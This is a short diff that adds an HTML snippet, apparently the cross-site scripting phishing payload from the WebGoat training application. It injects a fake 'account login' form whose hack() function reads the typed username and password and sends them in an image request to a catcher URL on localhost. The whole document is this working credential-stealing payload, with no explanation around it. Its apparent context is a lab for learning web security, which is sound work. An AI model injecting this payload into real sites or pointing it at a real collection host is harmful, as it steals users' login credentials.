@@ -1,0 +1,22 @@
+<script>
+  function hack(){
+    alert("Login="+document.forms[0].user.value
+      + "Password="+document.forms[0].pass.value);
+    XSSImage=new Image;
+    XSSImage.src="http://localhost/WebGoat/catcher"
+      +"?PROPERTY=yes"
+      +"&user="+document.forms[0].user.value
+      +"&password="+document.forms[0].pass.value;
+  }
+</script>
+
+<form>
+  <br><br><HR>
+  <H3>This feature requires account login:</H3>
+  <br><br>
+  Enter Username:<br><input type="text" id="user" name="user"><br>
+  Enter Password:<br><input type="password" name="pass"><br>
+  <input type="submit" name="login" value="login" onclick="hack()">
+</form>
+
+<br><br><HR>
